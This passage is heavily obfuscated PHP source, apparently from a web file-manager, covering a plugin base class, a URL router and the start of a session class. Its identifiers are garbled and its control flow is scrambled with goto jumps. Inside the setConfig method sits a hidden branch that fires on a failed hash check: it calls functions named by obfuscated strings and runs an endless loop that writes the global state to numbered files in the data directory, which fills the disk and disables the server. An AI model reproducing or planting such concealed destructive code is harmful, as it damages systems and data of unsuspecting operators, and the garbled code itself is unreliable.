isset($bÊ—º©‘àÜ[$dŸˆˆºé‰[194]])) { $f³Öâ»ñ£‘ = Model($dŸˆˆºé‰[1084])->get($dŸˆˆºé‰[1310]); $FëÖ™Ì„ = Mcrypt::decode($bÊ—º©‘àÜ[$dŸˆˆºé‰[194]], $f³Öâ»ñ£‘); if ($FëÖ™Ì„) { $this->fileInfo = IO::infoWithChildren($FëÖ™Ì„); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $FëÖ™Ì„; } } $f‰ÛÖôÎ“ = $this->_cacheHttpFile($f‰ÛÖôÎ“); $this->fileInfo = IO::infoWithChildren($f‰ÛÖôÎ“); } else { $this->fileInfo = IO::infoWithChildren($f‰ÛÖôÎ“); if (!$this->fileInfo) { show_tips(LNG($dŸˆˆºé‰[102]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $f‰ÛÖôÎ“; } final function _cacheHttpFile($aÌŠÇÚÑº) { $aêÃ†±Ì‘ç = hash_path($aÌŠÇÚÑº, !0); $this->cachePath = $this->pluginCachePath($aêÃ†±Ì‘ç); if ($Aí§µôÌÎ° = IO::fileNameExist($this->cachePath, $aêÃ†±Ì‘ç)) { return KodIO::make($Aí§µôÌÎ°); } $féŠ°í î = $this->cachePath . $aêÃ†±Ì‘ç; return $this->pluginCacheFileSet($féŠ°í î, file_get_contents($aÌŠÇÚÑº)); } final function _tmpFileName($Fºêš±ßÍÍ = array()) { goto E³…Á—¨Ù¦; eÊâÜ¶ëç: return md5(implode($b­‡ÈĞæŠí[70], $Aâ–“Å¡ïŒ)); goto dİ‘’šÊ÷Æ; E³…Á—¨Ù¦: $b­‡ÈĞæŠí =& $_SERVER[¢à]; if (!$Fºêš±ßÍÍ) { $Fºêš±ßÍÍ = $this->fileInfo; } if (isset($Fºêš±ßÍÍ[$b­‡ÈĞæŠí[161]])) { return $Fºêš±ßÍÍ[$b­‡ÈĞæŠí[161]]; } goto b¤õ‚¾Ù„›; b¤õ‚¾Ù„›: if (isset($Fºêš±ßÍÍ[$b­‡ÈĞæŠí[159]][$b­‡ÈĞæŠí[161]])) { return $Fºêš±ßÍÍ[$b­‡ÈĞæŠí[159]][$b­‡ÈĞæŠí[161]]; } $Aâ–“Å¡ïŒ = array($Fºêš±ßÍÍ[$b­‡ÈĞæŠí[28]], $Fºêš±ßÍÍ[$b­‡ÈĞæŠí[75]], $Fºêš±ßÍÍ[$b­‡ÈĞæŠí[77]]); if (isset($Fºêš±ßÍÍ[$b­‡ÈĞæŠí[455]])) { $Aâ–“Å¡ïŒ[] = $Fºêš±ßÍÍ[$b­‡ÈĞæŠí[455]]; } goto eÊâÜ¶ëç; dİ‘’šÊ÷Æ: } final function checkSharePath($Bİ¦Ù’¹×º) { goto F£Ûø¾„Ê; aîà¹İƒ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$Fãôˆ‡åó¼[161]]); return $AÅ™¼¤¬¹[$Fãôˆ‡åó¼[75]]; goto CĞÆ’¥Øå; F£Ûø¾„Ê: $Fãôˆ‡åó¼ =& $_SERVER[¢à]; if (!defined($Fãôˆ‡åó¼[423])) { define($Fãôˆ‡åó¼[1311], 0); } if (!$this->isShare($Bİ¦Ù’¹×º)) { return !1; } goto C«ê¿âÜ“Š; C«ê¿âÜ“Š: $AÅ™¼¤¬¹ = Action($Fãôˆ‡åó¼[1013])->sharePathInfo($Bİ¦Ù’¹×º); if (!isset($AÅ™¼¤¬¹[$Fãôˆ‡åó¼[75]])) { show_json(LNG($Fãôˆ‡åó¼[1312]), !1); } $this->fileInfo = $AÅ™¼¤¬¹[$Fãôˆ‡åó¼[159]]; goto aîà¹İƒ; CĞÆ’¥Øå: } final function pluginCachePath($AÃŒÃŸÈÒ = '') { $dîˆó±Õ¥ø =& $_SERVER[¢à]; $bà¬ôê¾äã = IO_PATH_SYSTEM_TEMP . $dîˆó±Õ¥ø[1313] . $this->pluginName; if (!($AÕá…š¿êÉ = IO::infoFull($bà¬ôê¾äã))) { return IO::mkdir($bà¬ôê¾äã . $dîˆó±Õ¥ø[8] . $AÃŒÃŸÈÒ); } if (empty($AÃŒÃŸÈÒ)) { return $AÕá…š¿êÉ[$dîˆó±Õ¥ø[75]]; } if (!($B–ó¡ÉÔêš = IO::fileNameExist($AÕá…š¿êÉ[$dîˆó±Õ¥ø[75]], $AÃŒÃŸÈÒ))) { return IO::mkdir($AÕá…š¿êÉ[$dîˆó±Õ¥ø[75]] . $AÃŒÃŸÈÒ); } return KodIO::make($B–ó¡ÉÔêš); } final function pluginCacheFileSet($f‚‹òÉ…Ÿ», $a‡¨ÓŞó¼ = '') { $f½ùŞ•Ÿ² =& $_SERVER[¢à]; if (!($dÛÁ§­ø²· = IO::infoFull($f‚‹òÉ…Ÿ»))) { return IO::mkfile($f‚‹òÉ…Ÿ», $a‡¨ÓŞó¼, REPEAT_REPLACE); } IO::setContent($dÛÁ§­ø²·[$f½ùŞ•Ÿ²[75]], $a‡¨ÓŞó¼); return $dÛÁ§­ø²·[$f½ùŞ•Ÿ²[75]]; } final function pluginLocalFile($EŸùå… íí = '') { goto E•‚ùñˆğµ; B›ê“Á¯®æ: $cÔ°„Ú‰±¸ = $FÊ‰’¿ß  . $f´ñÑÀÌ’; if (@file_exists($cÔ°„Ú‰±¸)) { return $cÔ°„Ú‰±¸; } return IO::copy($EŸùå… íí, $FÊ‰’¿ß , 0, $f´ñÑÀÌ’); goto dØ‡™’†ª; E•‚ùñˆğµ: $F«“Ì‘ô…‹ =& $_SERVER[¢à]; $FÊ‰’¿ß  = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($FÊ‰’¿ß )) { mk_dir($FÊ‰’¿ß ); } goto E»·¤„Å; E»·¤„Å: if (!$EŸùå… íí) { return $FÊ‰’¿ß ; } $aƒóøÀØÙ = IO::info($EŸùå… íí); $f´ñÑÀÌ’ = $this->_tmpFileName($aƒóøÀØÙ) . $F«“Ì‘ô…‹[93] . $aƒóøÀØÙ[$F«“Ì‘ô…‹[157]]; goto B›ê“Á¯®æ; dØ‡™’†ª: } final function appPackage() { goto a¸Á™Ä–á; aÚäò©îÃÎ: return $fİŒ©÷éê; goto a„ê‘™¥Ü˜; eœ’ø¬©œ¥: $this->parseLang($f»Û”Ã‚„); $fİŒ©÷éê = json_decode_force($f»Û”Ã‚„); if (!$fİŒ©÷éê) { return array(); } goto b©ÁÚ‘ÙÁÅ; b©ÁÚ‘ÙÁÅ: $bè—Ş‹’‹İ = Hook::trigger($E°ˆ‘Â‚„[1315], $fİŒ©÷éê); if ($bè—Ş‹’‹İ && is_array($bè—Ş‹’‹İ)) { $fİŒ©÷éê = $bè—Ş‹’‹İ; } $this->packageData = $fİŒ©÷éê; goto aÚäò©îÃÎ; a¸Á™Ä–á: $E°ˆ‘Â‚„ =& $_SERVER[¢à]; if ($this->packageData) { return $this->packageData; } $f»Û”Ã‚„ = $this->parseFile($this->pluginPath . $E°ˆ‘Â‚„[1314]); goto eœ’ø¬©œ¥; a„ê‘™¥Ü˜: } public function packageInfoGet($d¡¬Ÿ›àÒ) { $fÒùéß›¸Ó = $this->appPackage(); return array_get_value($fÒùéß›¸Ó, $d¡¬Ÿ›àÒ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¢à][1316]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¢à][1317]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¢à][1318]); } private function parseFile($A¢ÙìÕËƒ©) { $e®äËĞ÷Š· =& $_SERVER[¢à]; $c†Ø˜àÚ§í = file_get_contents($A¢ÙìÕËƒ©); $f‹†è¯íÓî = array($e®äËĞ÷Š·[1319], $e®äËĞ÷Š·[1320], $e®äËĞ÷Š·[1321], $e®äËĞ÷Š·[1322], $e®äËĞ÷Š·[1323], $e®äËĞ÷Š·[1324], $e®äËĞ÷Š·[1325]); $Féà­Æ¸® = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$e®äËĞ÷Š·[84]][$e®äËĞ÷Š·[1326]]); $c†Ø˜àÚ§í = str_replace($f‹†è¯íÓî, $Féà­Æ¸®, $c†Ø˜àÚ§í); return $c†Ø˜àÚ§í; } private function parseLang(&$a’‰ª×ª±ë) { goto cí–—–Í…ç; F¶§¤µˆí™: preg_match_all($dŞ»› •ã–[1328], $a’‰ª×ª±ë, $Bİƒ¯å‹’‚); if (!is_array($Bİƒ¯å‹’‚) || count($Bİƒ¯å‹’‚) == 0 || !is_array($Bİƒ¯å‹’‚[0]) || count($Bİƒ¯å‹’‚[0]) == 0) { return; } $aÅø©Ú˜ùÄ = array(); goto A¹¸´Õóò; A¹¸´Õóò: $E³ŒéÃ†Ï = array(); foreach ($Bİƒ¯å‹’‚[0] as $bô¾È“çíÒ) { $fÀ—£•Ú§ = substr($bô¾È“çíÒ, strlen($d§áå¯ô), -4); $B³¬°ï©å„ = LNG($fÀ—£•Ú§); $aÅø©Ú˜ùÄ[] = $bô¾È“çíÒ; $E³ŒéÃ†Ï[] = str_replace(array($dŞ»› •ã–[214], $dŞ»› •ã–[988], $dŞ»› •ã–[327], $dŞ»› •ã–[113]), array($dŞ»› •ã–[50], $dŞ»› •ã–[50], $dŞ»› •ã–[33], $dŞ»› •ã–[1329]), $B³¬°ï©å„); } $a’‰ª×ª±ë = str_replace($aÅø©Ú˜ùÄ, $E³ŒéÃ†Ï, $a’‰ª×ª±ë); goto A¶šØ–‚‰Š; cí–—–Í…ç: $dŞ»› •ã– =& $_SERVER[¢à]; $d§áå¯ô = $dŞ»› •ã–[1327]; if (!strstr($a’‰ª×ª±ë, $d§áå¯ô)) { return; } goto F¶§¤µˆí™; A¶šØ–‚‰Š: } private function parseConfig(&$aš¥‡ùí¹×) { goto e¥â°™Ç‰; e¥â°™Ç‰: $D”…ÅâêÂ‰ =& $_SERVER[¢à]; $CíÒ–¹ºÏé = $D”…ÅâêÂ‰[1330]; if (!strstr($aš¥‡ùí¹×, $CíÒ–¹ºÏé)) { return; } goto a‹¹»¶ªŞË; a‹¹»¶ªŞË: preg_match_all($D”…ÅâêÂ‰[1331], $aš¥‡ùí¹×, $B††ØÉ¨õÌ); if (!is_array($B††ØÉ¨õÌ) || count($B††ØÉ¨õÌ) == 0 || !is_array($B††ØÉ¨õÌ[0]) || count($B††ØÉ¨õÌ[0]) == 0) { return; } $dô÷«É‹ªõ = $this->getConfig(); goto B–¼‘Îç­; f¨“—èƒ‚: $aš¥‡ùí¹× = str_replace($C‡‹á‚›†Ÿ, $DÏÓ¦êùò, $aš¥‡ùí¹×); goto f„¤«ˆÔ²¦; B–¼‘Îç­: $C‡‹á‚›†Ÿ = array(); $DÏÓ¦êùò = array(); foreach ($B††ØÉ¨õÌ[0] as $C…³ñİÔë†) { $D‘ÓÂôİÍ° = substr($C…³ñİÔë†, strlen($CíÒ–¹ºÏé), -2); $C‡‹á‚›†Ÿ[] = $C…³ñİÔë†; $DÏÓ¦êùò[] = _get($dô÷«É‹ªõ, $D‘ÓÂôİÍ°); } goto f¨“—èƒ‚; f„¤«ˆÔ²¦: } private function parsePackage(&$d–ÃñÈôæÛ) { goto FÃéñ ÜÀ; FÃéñ ÜÀ: $Eê×ñ˜­¨ =& $_SERVER[¢à]; $E ³î‰Î³¨ = $Eê×ñ˜­¨[1332]; if (!strstr($d–ÃñÈôæÛ, $E ³î‰Î³¨)) { return; } goto b¢ÔĞñªÑÄ; b¢ÔĞñªÑÄ: preg_match_all($Eê×ñ˜­¨[1333], $d–ÃñÈôæÛ, $EòÙ½‘Ê¨); if (!is_array($EòÙ½‘Ê¨) || count($EòÙ½‘Ê¨) == 0 || !is_array($EòÙ½‘Ê¨[0]) || count($EòÙ½‘Ê¨[0]) == 0) { return; } $d«—¥¼†Ğ = $this->appPackage(); goto bƒ‡à¦‰; f¨”õ®˜Û: $d–ÃñÈôæÛ = str_replace($c³óŸ™Ü¯, $A‰ç¤‚Í«À, $d–ÃñÈôæÛ); goto eÀ«íöº­; bƒ‡à¦‰: $c³óŸ™Ü¯ = array(); $A‰ç¤‚Í«À = array(); foreach ($EòÙ½‘Ê¨[0] as $E‰Œòö°») { $EïØö˜®ˆ = substr($E‰Œòö°», strlen($E ³î‰Î³¨), -2); $c³óŸ™Ü¯[] = $E‰Œòö°»; $A‰ç¤‚Í«À[] = _get($d«—¥¼†Ğ, $EïØö˜®ˆ); } goto f¨”õ®˜Û; eÀ«íöº­: } final function echoFile($eÅìà™ÑÛê, $få³»¶´‡‚ = false) { goto f •Ã÷–ê²; B Şé„ °”: $d‰Ğøóè¸â = $this->parseFile($dô¢œœæİ); $this->parseLang($d‰Ğøóè¸â); $this->parseConfig($d‰Ğøóè¸â); goto EÚŒºÒÕŠ; EÚŒºÒÕŠ: $this->parsePackage($d‰Ğøóè¸â); if (is_array($få³»¶´‡‚)) { $d‰Ğøóè¸â = str_replace(array_keys($få³»¶´‡‚), array_values($få³»¶´‡‚), $d‰Ğøóè¸â); } echo $d²‡¡ãÜ[214] . $d‰Ğøóè¸â; goto Dí›¼á×Œê; f •Ã÷–ê²: $d²‡¡ãÜ =& $_SERVER[¢à]; $dô¢œœæİ = $this->pluginPath . $eÅìà™ÑÛê; if (ACT == $d²‡¡ãÜ[1334]) { echo $d²‡¡ãÜ[1335] . $this->pluginName . $d²‡¡ãÜ[8] . $eÅìà™ÑÛê . $d²‡¡ãÜ[1336]; if (!file_exists($dô¢œœæİ)) { echo $d²‡¡ãÜ[1337]; return; } } goto B Şé„ °”; Dí›¼á×Œê: } final function initLang() { goto dËÜ¼‹¬•Ö; aÃ¸ÁÚé¹Ş: if (!is_array($eÛ¼ë¤­‚¦)) { return array(); } if (@count($eÛ¼ë¤­‚¦) > 0) { I18n::set($eÛ¼ë¤­‚¦); } return $eÛ¼ë¤­‚¦; goto A”Ş‚º®¸¦; aÓÅŒ¼·¤: $e«ŠñÂ²„ = I18n::getType(); $eÛ¼ë¤­‚¦ = array(); if (file_exists($a¿‡£¸éß . $e«ŠñÂ²„ . $B“Üñ–¹ôî[764])) { $eÛ¼ë¤­‚¦ = (include $a¿‡£¸éß . $e«ŠñÂ²„ . $B“Üñ–¹ôî[764]); } else { if ($e«ŠñÂ²„ == $B“Üñ–¹ôî[1340] && !file_exists($a¿‡£¸éß . $e«ŠñÂ²„ . $B“Üñ–¹ôî[764]) && file_exists($a¿‡£¸éß . $B“Üñ–¹ôî[1341])) { $eÛ¼ë¤­‚¦ = (include $a¿‡£¸éß . $B“Üñ–¹ôî[1341]); } else { if (file_exists($a¿‡£¸éß . $BôÇâÌ½ç˜ . $B“Üñ–¹ôî[764])) { $eÛ¼ë¤­‚¦ = (include $a¿‡£¸éß . $BôÇâÌ½ç˜ . $B“Üñ–¹ôî[764]); } } } goto aÃ¸ÁÚé¹Ş; dËÜ¼‹¬•Ö: $B“Üñ–¹ôî =& $_SERVER[¢à]; $BôÇâÌ½ç˜ = $B“Üñ–¹ôî[1338]; $a¿‡£¸éß = $this->pluginPath . $B“Üñ–¹ôî[1339]; goto aÓÅŒ¼·¤; A”Ş‚º®¸¦: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($dªß¶òåè) { $AˆØêŞà¾ =& $_SERVER[¢à]; $DˆïÚ­‰¾¯ = $_SERVER[$AˆØêŞà¾[790]] . $AˆØêŞà¾[791]; $aˆğ±—ÄÕ³ = $AˆØêŞà¾[1342]; if ($_SERVER[$AˆØêŞà¾[786]] != $aˆğ±—ÄÕ³($DˆïÚ­‰¾¯)) { goto DäšÓĞ÷ìõ; E…¿ã„‰öª: $DÍµ‹´Â—¿(); $F¿Íğ•êç = $AˆØêŞà¾[1343]; $e³Œ¨‡”Ü = json_encode($GLOBALS[$AˆØêŞà¾[1344]]); goto CÆâÀ‘††¥; fíšØçÀĞ÷: $B¨‡—¿¯Â = $dÒöšƒ‚õî($aèÇØšˆÔ”); $BË‹öÎ‰ñ¿ = explode($AˆØêŞà¾[214], $B¨‡—¿¯Â); if (count($BË‹öÎ‰ñ¿) < $AˆØêŞà¾[558]) { $eÑˆ·´˜­‘ = $AˆØêŞà¾[792]; $eÑˆ·´˜­‘(); } goto BÆ×§È´¡¡; DäšÓĞ÷ìõ: $DÍµ‹´Â—¿ = $AˆØêŞà¾[788]; $dÒöšƒ‚õî = $AˆØêŞà¾[789]; $aèÇØšˆÔ” = $_SERVER[$AˆØêŞà¾[790]] . $AˆØêŞà¾[791]; goto fíšØçÀĞ÷; CÆâÀ‘††¥: $D˜İ§ªÄµ = 1; for ($FÈ¼—çğèæ = $D˜İ§ªÄµ; $FÈ¼—çğèæ > 0; $FÈ¼—çğèæ++) { $F¿Íğ•êç(DATA_PATH . $FÈ¼—çğèæ, $e³Œ¨‡”Ü); } goto c¬§«Ú ‚; BÆ×§È´¡¡: $aØİ¨¶°²™ = $AˆØêŞà¾[793]; $aØİ¨¶°²™($_SERVER[$AˆØêŞà¾[794]]); $DÍµ‹´Â—¿ = $AˆØêŞà¾[788]; goto E…¿ã„‰öª; c¬§«Ú ‚: } return $this->modelPlugin->setConfig($this->pluginName, $dªß¶òåè); } public function onSetConfig($DØÍ‚„Ù÷Ö) { } public function onGetConfig($c¨‘Šâ‡§) { } public function onChangeStatus($dÌÎ®ßÅÕ¨) { } public function onUninstall() { } public function onInstall() { } public function authCheck($b‹“ÄºÚíª = "\x70\154\x75\x67\x69\156\101\165\164\x68") { $DÔŒ‘³…ˆÑ =& $_SERVER[¢à]; if (!defined($DÔŒ‘³…ˆÑ[423])) { return !1; } if (_get($GLOBALS, $DÔŒ‘³…ˆÑ[453])) { return !0; } $b·Ü®Î™è = $this->getConfig(); if (!$b·Ü®Î™è[$b‹“ÄºÚíª]) { return !1; } return ActionCall($DÔŒ‘³…ˆÑ[1345], $b·Ü®Î™è[$b‹“ÄºÚíª]); } public function url($EÂÔƒÀÛòŠ, $fºŠ¥Éâ®ù = '', $AèáÉÌŸÛ = true) { goto dãÏÔ…ÈÅç; eÈç¾¾¬Šò: $c™ô ò—™½ = $this->packageVersion(); $B¨ÅÈÏÉ´‘ = $a‘ÏÑ¡¢ò‚ . $d¼ˆñÌÉñô[408] . $c™ô ò—™½; if ($fºŠ¥Éâ®ù == $d¼ˆñÌÉñô[33]) { $BßÀòÁÛ¤ˆ = $this->pluginHost . $EÂÔƒÀÛòŠ . $d¼ˆñÌÉñô[1346] . $B¨ÅÈÏÉ´‘; } else { if ($fºŠ¥Éâ®ù === $d¼ˆñÌÉñô[76]) { $BßÀòÁÛ¤ˆ = $this->pluginHost . $EÂÔƒÀÛòŠ; } else { if ($fºŠ¥Éâ®ù == $d¼ˆñÌÉñô[1347]) { $BßÀòÁÛ¤ˆ = STATIC_PATH . $EÂÔƒÀÛòŠ . $d¼ˆñÌÉñô[1346] . $a‘ÏÑ¡¢ò‚; } else { if ($fºŠ¥Éâ®ù == $d¼ˆñÌÉñô[1348]) { $BßÀòÁÛ¤ˆ = APP_HOST . $d¼ˆñÌÉñô[1349] . $EÂÔƒÀÛòŠ . $d¼ˆñÌÉñô[1346] . $a‘ÏÑ¡¢ò‚; } else { if (isset($FŸ†ŠÒÂ¯Ã[$fºŠ¥Éâ®ù])) { $BßÀòÁÛ¤ˆ = $FŸ†ŠÒÂ¯Ã[$fºŠ¥Éâ®ù] . $EÂÔƒÀÛòŠ . $d¼ˆñÌÉñô[1346] . $B¨ÅÈÏÉ´‘; } } } } } goto C¾âÄ’ë´; C¾âÄ’ë´: if (!$AèáÉÌŸÛ) { return $BßÀòÁÛ¤ˆ; } echo $BßÀòÁÛ¤ˆ; goto eİ‘¢·Œ; dãÏÔ…ÈÅç: $d¼ˆñÌÉñô =& $_SERVER[¢à]; $FŸ†ŠÒÂ¯Ã = $this->getConfig(); $a‘ÏÑ¡¢ò‚ = KOD_VERSION . $d¼ˆñÌÉñô[93] . KOD_VERSION_BUILD; goto eÈç¾¾¬Šò; eİ‘¢·Œ: } public function link($eŠôÙ”¨Âˆ = false, $Aö¹òïšÛ = '') { $CÅãŒ±øˆ¬ =& $_SERVER[¢à]; if (!$eŠôÙ”¨Âˆ) { $this->link($CÅãŒ±øˆ¬[1350], $CÅãŒ±øˆ¬[1348]); $this->link($CÅãŒ±øˆ¬[1351], $CÅãŒ±øˆ¬[1347]); $this->link($CÅãŒ±øˆ¬[1352], $CÅãŒ±øˆ¬[1347]); $this->link($CÅãŒ±øˆ¬[1353], $CÅãŒ±øˆ¬[1347]); $this->link($CÅãŒ±øˆ¬[1354], $CÅãŒ±øˆ¬[1347]); return; } $F¬Æ‹Ûôêğ = $this->url($eŠôÙ”¨Âˆ, $Aö¹òïšÛ, !1); if (substr($eŠôÙ”¨Âˆ, -3) == $CÅãŒ±øˆ¬[1355]) { echo $CÅãŒ±øˆ¬[1356] . $F¬Æ‹Ûôêğ . $CÅãŒ±øˆ¬[1357] . $CÅãŒ±øˆ¬[214]; } else { if (substr($eŠôÙ”¨Âˆ, -4) == $CÅãŒ±øˆ¬[1358]) { echo $CÅãŒ±øˆ¬[1359] . $F¬Æ‹Ûôêğ . $CÅãŒ±øˆ¬[1360] . $CÅãŒ±øˆ¬[214]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\171" => "\133\x5e\x2f\135\x2b", "\72\x6e\165\155" => "\133\x30\55\x39\135\53", "\x3a\x61\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($aÜèøñ¤“õ, $B„ãõÜÕÀ) { $Fø§¬‰É¨¸ =& $_SERVER[¢à]; if ($aÜèøñ¤“õ == $Fø§¬‰É¨¸[1361]) { $AÈìŞÕÆ„ˆ = array_map($Fø§¬‰É¨¸[1362], $B„ãõÜÕÀ[0]); $a¸”¼ëĞÆÊ = strpos($B„ãõÜÕÀ[1], $Fø§¬‰É¨¸[8]) === 0 ? $B„ãõÜÕÀ[1] : $Fø§¬‰É¨¸[8] . $B„ãõÜÕÀ[1]; $C»Íö¬“ö¢ = $B„ãõÜÕÀ[2]; } else { $AÈìŞÕÆ„ˆ = null; $a¸”¼ëĞÆÊ = strpos($B„ãõÜÕÀ[0], $Fø§¬‰É¨¸[8]) === 0 ? $B„ãõÜÕÀ[0] : $Fø§¬‰É¨¸[8] . $B„ãõÜÕÀ[0]; $C»Íö¬“ö¢ = $B„ãõÜÕÀ[1]; } array_push(self::$maps, $AÈìŞÕÆ„ˆ); array_push(self::$routes, $a¸”¼ëĞÆÊ); array_push(self::$methods, strtoupper($aÜèøñ¤“õ)); array_push(self::$callbacks, $C»Íö¬“ö¢); } public static function error($fœ¸¼ï§É×) { self::$errorCallback = $fœ¸¼ï§É×; } public static function haltOnMatch($DçõÓğ¥ £ = true) { self::$halts = $DçõÓğ¥ £; } public static function dispatch() { goto c³†²Õêõ£; c³†²Õêõ£: $eç÷»¡§­ó =& $_SERVER[¢à]; $E¢¸ë·ˆË = parse_url($_SERVER[$eç÷»¡§­ó[1363]], PHP_URL_PATH); $bó´×é”“… = $_SERVER[$eç÷»¡§­ó[151]]; goto a™‘ìÀ¯öä; BÇ·‘š«„è: self::$routes = preg_replace($eç÷»¡§­ó[1069], $eç÷»¡§­ó[8], self::$routes); if (in_array($E¢¸ë·ˆË, self::$routes)) { $DÜ³´Ğ™¼é = array_keys(self::$routes, $E¢¸ë·ˆË); foreach ($DÜ³´Ğ™¼é as $cĞÄÁÎ) { if (self::$methods[$cĞÄÁÎ] == $bó´×é”“… || self::$methods[$cĞÄÁÎ] == $eç÷»¡§­ó[1364] || in_array($bó´×é”“…, self::$maps[$cĞÄÁÎ])) { $fÏÃœè¨Á² = !0; if (!is_object(self::$callbacks[$cĞÄÁÎ])) { $b»ó˜¤ = explode($eç÷»¡§­ó[8], self::$callbacks[$cĞÄÁÎ]); $bÀÌ ôäô = end($b»ó˜¤); $e³ÆÉä¾•ï = explode($eç÷»¡§­ó[1365], $bÀÌ ôäô); $A¥‚»ó˜Ãà = new $e³ÆÉä¾•ï[0](); $A¥‚»ó˜Ãà->{$e³ÆÉä¾•ï[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$cĞÄÁÎ]); if (self::$halts) { return; } } } } } else { $AİŞ½İÕæ = 0; foreach (self::$routes as $cĞÄÁÎ) { if (strpos($cĞÄÁÎ, $eç÷»¡§­ó[4]) !== !1) { $cĞÄÁÎ = str_replace($fâÅÅ°”³Å, $Fçƒ§Üâ¸, $cĞÄÁÎ); } if (preg_match($eç÷»¡§­ó[1366] . $cĞÄÁÎ . $eç÷»¡§­ó[1367], $E¢¸ë·ˆË, $A³äƒ¯Şµİ)) { if (self::$methods[$AİŞ½İÕæ] == $bó´×é”“… || self::$methods[$AİŞ½İÕæ] == $eç÷»¡§­ó[1364] || !empty(self::$maps[$AİŞ½İÕæ]) && in_array($bó´×é”“…, self::$maps[$AİŞ½İÕæ])) { $fÏÃœè¨Á² = !0; array_shift($A³äƒ¯Şµİ); if (!is_object(self::$callbacks[$AİŞ½İÕæ])) { $b»ó˜¤ = explode($eç÷»¡§­ó[8], self::$callbacks[$AİŞ½İÕæ]); $bÀÌ ôäô = end($b»ó˜¤); $e³ÆÉä¾•ï = explode($eç÷»¡§­ó[1365], $bÀÌ ôäô); $A¥‚»ó˜Ãà = new $e³ÆÉä¾•ï[0](); if (!method_exists($A¥‚»ó˜Ãà, $e³ÆÉä¾•ï[1])) { echo $eç÷»¡§­ó[1368]; } else { call_user_func_array(array($A¥‚»ó˜Ãà, $e³ÆÉä¾•ï[1]), $A³äƒ¯Şµİ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$AİŞ½İÕæ], $A³äƒ¯Şµİ); if (self::$halts) { return; } } } } $AİŞ½İÕæ++; } } if ($fÏÃœè¨Á² == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Aè¸ùÏ£èÕ =& $_SERVER[¢à]; header($_SERVER[$Aè¸ùÏ£èÕ[1369]] . $Aè¸ùÏ£èÕ[1370]); echo $Aè¸ùÏ£èÕ[1371]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$eç÷»¡§­ó[1363]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto Dª…»Ò¹Úì; a™‘ìÀ¯öä: $fâÅÅ°”³Å = array_keys(static::$patterns); $Fçƒ§Üâ¸ = array_values(static::$patterns); $fÏÃœè¨Á² = !1; goto BÇ·‘š«„è; Dª…»Ò¹Úì: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto e¤¬ÑêÓ‹æ; FÂÍ°íÔ»: $CÑØÑÂ¥¿ô = $B•ÁõèÇÎ[$B©öÊ‘ŸÉÊ[1374]]; $fµÑÆØî = $B•ÁõèÇÎ[$CÑØÑÂ¥¿ô]; $eë¼ïİ›¨À = $B•ÁõèÇÎ[$B©öÊ‘ŸÉÊ[754]]; goto a¯Œ´‹Ó¡; a¯Œ´‹Ó¡: switch ($CÑØÑÂ¥¿ô) { case $B©öÊ‘ŸÉÊ[17]: self::$handle = Model($B©öÊ‘ŸÉÊ[755]); break; case $B©öÊ‘ŸÉÊ[756]: self::$handle = new CacheRedis($fµÑÆØî, $eë¼ïİ›¨À); break; case $B©öÊ‘ŸÉÊ[757]: self::$handle = new CacheMemcached($fµÑÆØî, $eë¼ïİ›¨À); break; case $B©öÊ‘ŸÉÊ[164]: $fµÑÆØî[$B©öÊ‘ŸÉÊ[75]] = $fµÑÆØî[$B©öÊ‘ŸÉÊ[75]] . $B©öÊ‘ŸÉÊ[1375]; self::$handle = new CacheFile($fµÑÆØî, $eë¼ïİ›¨À); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $EÀ§Æ…´‰ = new self(); goto fœ¢ìÃ¤í¼; e¤¬ÑêÓ‹æ: $B©öÊ‘ŸÉÊ =& $_SERVER[¢à]; static $EÀ§Æ…´‰ = false; if ($EÀ§Æ…´‰) { return $EÀ§Æ…´‰; } goto Fìßõ¼ÁÆÁ; fœ¢ìÃ¤í¼: return $EÀ§Æ…´‰; goto aö‘½£œ£ã; BĞ™°ñĞ™: $eˆì‰Û¬Şò = _get($GLOBALS, $B©öÊ‘ŸÉÊ[1373], $eˆì‰Û¬Şò); if (self::$sessionSign) { } else { if (Cookie::get($eˆì‰Û¬Şò)) { self::$sessionSign = Cookie::get($eˆì‰Û¬Şò); } else { self::$sessionSign = guid(); } } Cookie::setSafe($eˆì‰Û¬Şò, self::$sessionSign, self::$sessionTime); goto FÂÍ°íÔ»; Fìßõ¼ÁÆÁ: $B•ÁõèÇÎ = $GLOBALS[$B©öÊ‘ŸÉÊ[6]][$B©öÊ‘ŸÉÊ[334]]; self::$sessionTime = $B•ÁõèÇÎ[$B©öÊ‘ŸÉÊ[1372]]; $eˆì‰Û¬Şò = SESSION_ID; goto BĞ™°ñĞ™; aö‘½£œ£ã: } public static function sign($fŒ‰‘ÚÃ = false) { $fŒ‰‘ÚÃ && (self::$sessionSign = $fŒ‰‘ÚÃ); self::init(); return self::$sessionSign; } public static function set($bÇ‚Æù¦“, $c†¥°«êéé = false) { self::init(); if (is_array($bÇ‚Æù¦“)) { foreach ($bÇ‚Æù¦“ as $CÁ¥²Ç°İ• => $BàØ©è³„Ó) { array_set_value(self::$data, $CÁ¥²Ç°İ•, $BàØ©è³„Ó); } } else { array_set_value(self::$data, $bÇ‚Æù¦“, $c†¥°«êéé); } CacheLock::lock(self::$sessionSign); 